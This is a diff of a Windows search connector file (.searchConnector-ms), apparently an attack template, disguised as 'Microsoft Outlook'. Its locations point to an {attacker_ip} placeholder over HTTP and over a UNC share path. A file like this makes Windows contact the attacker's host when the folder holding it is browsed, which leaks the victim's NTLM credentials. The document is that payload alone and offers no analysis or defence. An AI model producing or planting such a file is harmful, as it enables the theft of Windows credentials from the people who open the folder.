@@ -1,12 +1,16 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <searchConnectorDescription xmlns="http://schemas.microsoft.com/windows/2009/searchConnector">
-	<description>Microsoft Outlook</description>
-	<isSearchOnlyItem>false</isSearchOnlyItem>
-	<includeInStartMenuScope>true</includeInStartMenuScope>
-	<templateInfo>
-		<folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}</folderType>
-	</templateInfo>
-	<simpleLocation>
-		<url>https://{{attacker_ip}}/</url>
-	</simpleLocation>
+    <description>Microsoft Outlook</description>
+    <isSearchOnlyItem>false</isSearchOnlyItem>
+    <includeInStartMenuScope>true</includeInStartMenuScope>
+    <iconReference>imageres.dll,-1003</iconReference>
+    <templateInfo>
+        <folderType>{{91475FE5-586B-4EBA-8D75-D17434B8CDF6}}</folderType>
+    </templateInfo>
+    <simpleLocation>
+        <url>http://{attacker_ip}/</url>
+    </simpleLocation>
+    <simpleLocation>
+        <url>\\{attacker_ip}\test</url>
+    </simpleLocation>
 </searchConnectorDescription>
